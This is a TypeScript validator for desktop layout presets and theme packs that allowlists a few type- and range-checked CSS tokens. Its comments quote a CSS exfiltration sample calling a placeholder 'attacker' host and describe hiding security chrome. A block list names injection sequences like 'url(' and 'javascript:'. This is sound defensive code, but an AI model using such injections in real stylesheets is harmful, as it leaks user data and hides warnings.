/**
 * The security boundary.
 *
 * Everything that becomes desktop layout state — a built-in preset, a
 * third-party pack, a value read back out of localStorage — goes through here
 * first. Not "the UI calls this before writing": the STORE calls this on every
 * load, so hand-editing localStorage in devtools buys you a fallback to stock,
 * not a bypass. That is the difference between a check and a boundary.
 *
 * # What it forbids, and why
 *
 * 1. UNKNOWN KEYS ARE ERRORS, not ignored fields. A validator that drops what it
 *    does not recognise is an invitation to smuggle: `{"css": "...", "edge":
 *    "bottom"}` would validate, and the next person to add a passthrough would
 *    ship the injection. Rejecting the whole object means the format can only
 *    ever carry what is written down here.
 *
 * 2. NO CSS. Not a property, not a declaration, not a stylesheet URL. The only
 *    styling a pack can express is five namespaced custom properties from
 *    TOKEN_ALLOWLIST, each type-checked and range-checked. Concretely this
 *    closes two attacks at once:
 *      · exfiltration — `background: url(https://attacker/?leak=…)` is the
 *        classic CSS side channel, and there is no value in this grammar that
 *        can contain a URL. `url(`, `image-set(`, `@import` and `element(` are
 *        rejected as substrings on top of the grammar, so a future token kind
 *        cannot quietly re-open it.
 *      · trust-chrome spoofing — this OS draws security state in chrome:
 *        shell/TrustBadge (AI tier, egress, at-rest lock), PublicAppBanner
 *        ("anyone on the internet can view this"), SharedDesktopNotice
 *        ("someone else is on this desktop"), TransparencyPanel. A theme that
 *        could set `display:none`, `position:fixed`, `opacity:0` or a
 *        background on those elements could hide a live warning or paint a fake
 *        reassurance. None of them read a `--vd-*` token, and no pack can reach
 *        a selector, so there is no mechanism — which is stronger than a
 *        denylist of the surfaces we remembered to protect.
 *
 * 3. RANGES, not just types. `--vd-dock-opacity: 0` is a perfectly well-typed
 *    number and it produces a dock that occupies its edge while being invisible
 *    — a UI you cannot navigate back out of. The floor is 0.6. Same reasoning
 *    for the 28px tile floor.
 *
 * 4. FORM-FACTOR ARITHMETIC. A phone dock may not be vertical and may not hold
 *    more than MOBILE_MAX_ITEMS, because at 390px those produce an unusable
 *    layout — see types.ts for the derivation. A preset is not allowed to be
 *    beautiful at 1440px and broken on a phone.
 */

import {
  APP_ID_RE, DESKTOP_MAX_ITEMS, DOCK_ALIGNS, DOCK_EDGES, DOCK_SIZES, DOCK_STYLES,
  FORM_FACTORS, MOBILE_EDGES, MOBILE_MAX_ITEMS, MOBILE_SIZES, PACK_FORMAT, PACK_VERSION,
  PRESET_ID_RE, TOKEN_ALLOWLIST, WINDOW_CONTROL_SIDES,
  type DesktopLayout, type DockProfile, type FormFactor, type LayoutPack,
  type LayoutPreset, type ValidationResult,
} from './types'

function isRecord(x: unknown): x is Record<string, unknown> {
  return typeof x === 'object' && x !== null && !Array.isArray(x)
}

function ok<T>(value: T): ValidationResult<T> {
  return { ok: true, value, errors: [] }
}

function fail<T>(errors: string[]): ValidationResult<T> {
  return { ok: false, value: null, errors }
}

/**
 * Reject any key we did not write down. See the header — silently dropping
 * unknown keys is how a format grows an injection point.
 */
function rejectUnknownKeys(obj: Record<string, unknown>, allowed: readonly string[], where: string, errors: string[]): void {
  for (const key of Object.keys(obj)) {
    if (!allowed.includes(key)) errors.push(`${where}: unknown key "${key}"`)
  }
}

function enumField<T extends string>(
  obj: Record<string, unknown>, key: string, allowed: readonly T[], where: string, errors: string[],
): T | null {
  const v = obj[key]
  if (typeof v !== 'string' || !(allowed as readonly string[]).includes(v)) {
    errors.push(`${where}.${key}: expected one of ${allowed.join(' | ')}, got ${JSON.stringify(v)}`)
    return null
  }
  return v as T
}

function boolField(obj: Record<string, unknown>, key: string, where: string, errors: string[]): boolean | null {
  const v = obj[key]
  if (typeof v !== 'boolean') {
    errors.push(`${where}.${key}: expected boolean, got ${JSON.stringify(v)}`)
    return null
  }
  return v
}

function stringField(obj: Record<string, unknown>, key: string, where: string, errors: string[], max = 200): string | null {
  const v = obj[key]
  if (typeof v !== 'string' || v.length === 0 || v.length > max) {
    errors.push(`${where}.${key}: expected a non-empty string of at most ${max} characters`)
    return null
  }
  return v
}

const DOCK_PROFILE_KEYS = ['edge', 'size', 'style', 'align', 'autohide', 'launcher', 'assistant', 'drawer', 'items'] as const

/**
 * One dock profile for one form factor.
 *
 * `formFactor` is not cosmetic: the mobile profile is held to MOBILE_EDGES and
 * MOBILE_MAX_ITEMS, and mobile.drawer must be true because a phone strip cannot
 * reach the app library any other way.
 */
export function validateDockProfile(input: unknown, formFactor: FormFactor, where: string): ValidationResult<DockProfile> {
  const errors: string[] = []
  if (!isRecord(input)) return fail([`${where}: expected an object`])
  rejectUnknownKeys(input, DOCK_PROFILE_KEYS, where, errors)

  const edges = formFactor === 'mobile' ? MOBILE_EDGES : DOCK_EDGES
  const edge = enumField(input, 'edge', edges, where, errors)
  const sizes = formFactor === 'mobile' ? MOBILE_SIZES : DOCK_SIZES
  const size = enumField(input, 'size', sizes, where, errors)
  const style = enumField(input, 'style', DOCK_STYLES, where, errors)
  const align = enumField(input, 'align', DOCK_ALIGNS, where, errors)
  const autohide = boolField(input, 'autohide', where, errors)
  const launcher = boolField(input, 'launcher', where, errors)
  const assistant = boolField(input, 'assistant', where, errors)
  const drawer = boolField(input, 'drawer', where, errors)

  const maxItems = formFactor === 'mobile' ? MOBILE_MAX_ITEMS : DESKTOP_MAX_ITEMS
  const rawItems = input.items
  const items: string[] = []
  if (!Array.isArray(rawItems)) {
    errors.push(`${where}.items: expected an array of app ids`)
  } else if (rawItems.length > maxItems) {
    errors.push(`${where}.items: ${rawItems.length} items exceeds the ${formFactor} maximum of ${maxItems}`)
  } else {
    const seen = new Set<string>()
    for (const [i, id] of rawItems.entries()) {
      if (typeof id !== 'string' || !APP_ID_RE.test(id)) {
        errors.push(`${where}.items[${i}]: not a valid app id (lowercase slug) — got ${JSON.stringify(id)}`)
        continue
      }
      if (seen.has(id)) {
        errors.push(`${where}.items[${i}]: duplicate app id "${id}"`)
        continue
      }
      seen.add(id)
      items.push(id)
    }
  }

  // A phone dock with no drawer strands the library: MobileStack's strip holds a
  // handful of items and there is no menu bar behind it.
  if (formFactor === 'mobile' && drawer === false) {
    errors.push(`${where}.drawer: a mobile dock must keep the app-drawer affordance — it is the only route to the full library at phone width`)
  }

  if (errors.length) return fail<DockProfile>(errors)
  return ok<DockProfile>({
    edge: edge!, size: size!, style: style!, align: align!,
    autohide: autohide!, launcher: launcher!, assistant: assistant!, drawer: drawer!,
    items,
  })
}

/* ── Token values ─────────────────────────────────────────────────────────────
   The grammar is deliberately tiny and anchored. Nothing here can express a
   function call, a URL, a second declaration, or a comment. */

const LENGTH_RE = /^(0|[0-9]{1,3}(\.[0-9]{1,2})?)px$/
const NUMBER_RE = /^(0|1|0\.[0-9]{1,3})$/
const COLOR_RE = /^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/

/**
 * Substrings that must never appear in a token value, checked ON TOP of the
 * grammar above.
 *
 * The grammar already makes all of these unreachable. They are here anyway
 * because the grammar is the thing most likely to be loosened by a future
 * change ("we just need one more unit"), and this list is the thing that would
 * still be true afterwards. `url(` and friends are the CSS exfiltration
 * channel; `;` `}` `{` and `/*` are how one declaration becomes several.
 */
const FORBIDDEN_SUBSTRINGS = ['url(', 'image-set', '@import', 'element(', 'expression', 'javascript:', 'data:', '\\', ';', '{', '}', '/*', '<', '>', 'var(', 'attr(']

/**
 * `where` names the JSON path this token came from, and it is threaded through
 * to every message rather than left at the default.
 *
 * A pack developer gets these strings straight out of the CLI, and
 * `tokens["--vd-accent"]: …` does not tell them WHICH of a manifest's objects
 * was wrong. Every other error in this file carries its path; this one used to
 * hardcode `tokens` and silently drop it, which made the documented CLI output
 * a lie.
 */
export function validateTokenValue(name: string, raw: unknown, where = 'tokens'): ValidationResult<string> {
  const at = `${where}["${name}"]`
  const rule = TOKEN_ALLOWLIST[name]
  if (!rule) {
    return fail([`${where}: "${name}" is not an allowlisted custom property (allowed: ${Object.keys(TOKEN_ALLOWLIST).join(', ')})`])
  }
  if (typeof raw !== 'string') return fail([`${at}: expected a string`])
  const value = raw.trim()
  if (value.length === 0 || value.length > 32) return fail([`${at}: value must be 1–32 characters`])
  if (/[^\x20-\x7e]/.test(value)) return fail([`${at}: value must be printable ASCII`])
  const lowered = value.toLowerCase()
  for (const bad of FORBIDDEN_SUBSTRINGS) {
    if (lowered.includes(bad)) return fail([`${at}: value contains forbidden sequence "${bad}"`])
  }

  if (rule.kind === 'color') {
    if (!COLOR_RE.test(value)) return fail([`${at}: expected #rgb or #rrggbb, got ${JSON.stringify(value)}`])
    return ok(value.toLowerCase())
  }
  if (rule.kind === 'length') {
    if (!LENGTH_RE.test(value)) return fail([`${at}: expected a px length, got ${JSON.stringify(value)}`])
    const n = parseFloat(value)
    if (rule.min !== undefined && n < rule.min) return fail([`${at}: ${n}px is below the minimum of ${rule.min}px — ${rule.doc}`])
    if (rule.max !== undefined && n > rule.max) return fail([`${at}: ${n}px is above the maximum of ${rule.max}px`])
    return ok(`${n}px`)
  }
  // number
  if (!NUMBER_RE.test(value)) return fail([`${at}: expected a number between 0 and 1, got ${JSON.stringify(value)}`])
  const n = parseFloat(value)
  if (rule.min !== undefined && n < rule.min) return fail([`${at}: ${n} is below the minimum of ${rule.min} — ${rule.doc}`])
  if (rule.max !== undefined && n > rule.max) return fail([`${at}: ${n} is above the maximum of ${rule.max}`])
  return ok(String(n))
}

export function validateTokens(input: unknown, where = 'tokens'): ValidationResult<Record<string, string>> {
  if (input === undefined || input === null) return ok({})
  if (!isRecord(input)) return fail([`${where}: expected an object`])
  const errors: string[] = []
  const out: Record<string, string> = {}
  for (const [name, raw] of Object.entries(input)) {
    const r = validateTokenValue(name, raw, where)
    if (r.ok) out[name] = r.value
    else errors.push(...r.errors)
  }
  return errors.length ? fail(errors) : ok(out)
}

const LAYOUT_BODY_KEYS = ['dock', 'windowControls', 'tokens'] as const
const LAYOUT_KEYS = ['presetId', ...LAYOUT_BODY_KEYS] as const

function validateLayoutBody(input: unknown, where: string): ValidationResult<Omit<DesktopLayout, 'presetId'>> {
  if (!isRecord(input)) return fail([`${where}: expected an object`])
  const errors: string[] = []

  const dockRaw = input.dock
  const dock = {} as Record<FormFactor, DockProfile>
  if (!isRecord(dockRaw)) {
    errors.push(`${where}.dock: expected an object keyed by form factor (${FORM_FACTORS.join(', ')})`)
  } else {
    rejectUnknownKeys(dockRaw, FORM_FACTORS, `${where}.dock`, errors)
    for (const ff of FORM_FACTORS) {
      const r = validateDockProfile(dockRaw[ff], ff, `${where}.dock.${ff}`)
      if (r.ok) dock[ff] = r.value
      else errors.push(...r.errors)
    }
  }

  const windowControls = enumField(input, 'windowControls', WINDOW_CONTROL_SIDES, where, errors)
  const tokensResult = validateTokens(input.tokens, `${where}.tokens`)
  if (!tokensResult.ok) errors.push(...tokensResult.errors)

  if (errors.length) return fail(errors)
  return ok({ dock, windowControls: windowControls!, tokens: tokensResult.value! })
}

/**
 * A complete layout, as persisted. Called by the store on EVERY read, so a
 * tampered or stale localStorage value degrades to stock rather than applying.
 */
export function validateLayout(input: unknown, where = 'layout'): ValidationResult<DesktopLayout> {
  if (!isRecord(input)) return fail([`${where}: expected an object`])
  const errors: string[] = []
  rejectUnknownKeys(input, LAYOUT_KEYS, where, errors)
  const presetId = stringField(input, 'presetId', where, errors, 64)
  if (presetId !== null && !PRESET_ID_RE.test(presetId)) {
    errors.push(`${where}.presetId: not a valid id (lowercase slug) — got ${JSON.stringify(presetId)}`)
  }
  const body = validateLayoutBody(input, where)
  if (!body.ok) errors.push(...body.errors)
  if (errors.length) return fail(errors)
  return ok({ presetId: presetId!, ...body.value! })
}

const PACK_KEYS = ['format', 'version', 'id', 'name', 'familiar', 'summary', 'layout'] as const

/**
 * A third-party pack manifest — the public format documented in
 * roadmap/CUSTOMIZATION.md and schema'd in ./schema.json.
 *
 * This is the function `npm run desktop:validate-pack` calls, the function the
 * installer calls, and the function presets.ts calls for the one built-in
 * preset that is authored THROUGH the format rather than around it. Same code
 * path for our packs and yours — which is the only way to know the format is
 * actually usable.
 */
export function validatePack(input: unknown, where = 'pack'): ValidationResult<LayoutPreset> {
  if (!isRecord(input)) return fail([`${where}: expected a JSON object`])
  const errors: string[] = []
  rejectUnknownKeys(input, PACK_KEYS, where, errors)

  if (input.format !== PACK_FORMAT) errors.push(`${where}.format: expected "${PACK_FORMAT}", got ${JSON.stringify(input.format)}`)
  if (input.version !== PACK_VERSION) errors.push(`${where}.version: expected ${PACK_VERSION}, got ${JSON.stringify(input.version)}`)

  const id = stringField(input, 'id', where, errors, 64)
  if (id !== null && !PRESET_ID_RE.test(id)) errors.push(`${where}.id: not a valid id (lowercase slug) — got ${JSON.stringify(id)}`)
  const name = stringField(input, 'name', where, errors, 48)
  const familiar = stringField(input, 'familiar', where, errors, 120)
  const summary = stringField(input, 'summary', where, errors, 240)

  const body = validateLayoutBody(input.layout, `${where}.layout`)
  if (!body.ok) errors.push(...body.errors)

  if (errors.length) return fail(errors)
  return ok<LayoutPreset>({
    id: id!, name: name!, familiar: familiar!, summary: summary!,
    source: 'pack', layout: body.value!,
  })
}

/** Re-export for the CLI, which reports the manifest shape it accepts. */
export type { LayoutPack }
